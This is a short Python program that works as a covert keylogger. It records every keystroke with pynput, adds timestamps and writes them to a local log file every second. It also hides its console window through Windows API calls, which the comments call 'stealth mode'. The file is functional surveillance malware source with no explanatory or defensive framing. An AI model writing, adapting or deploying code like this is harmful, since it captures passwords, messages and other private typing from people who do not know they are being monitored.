from pynput import keyboard
import time
import os
import ctypes
import threading

# File to log keystrokes
LOG_FILE = "keylogger.log"

# Buffer to store keystrokes before logging
keystroke_buffer = []
current_typed = ""  # Accumulate keystrokes for a single second

# Lock for thread-safe access to the buffer
buffer_lock = threading.Lock()

def write_to_file():
    """Periodically write buffered keystrokes to the log file."""
    global current_typed
    while True:
        time.sleep(1)  # Write every second
        with buffer_lock:
            if current_typed:
                # Add the accumulated keystrokes to the buffer with a timestamp
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                log_entry = f"[{timestamp}] {current_typed}\n"
                keystroke_buffer.append(log_entry)
                current_typed = ""  # Reset the typed characters

            if keystroke_buffer:
                # Write buffered data to the log file
                with open(LOG_FILE, "a") as f:
                    f.writelines(keystroke_buffer)
                # Clear the buffer after writing
                keystroke_buffer.clear()

def on_press(key):
    """Handle key press events."""
    global current_typed
    try:
        data = key.char  # Printable characters
    except AttributeError:
        # Special keys (e.g., Shift, Ctrl, etc.)
        data = f"[{key.name.upper()}]"

    # Accumulate characters into `current_typed`
    with buffer_lock:
        current_typed += data

def hide_console_window():
    """Hide the console window."""
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE

def main():
    """Main function."""
    # Hide the console window for stealth mode
    hide_console_window()

    # Start a thread for writing the log file every second
    writer_thread = threading.Thread(target=write_to_file, daemon=True)
    writer_thread.start()

    # Set up the keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
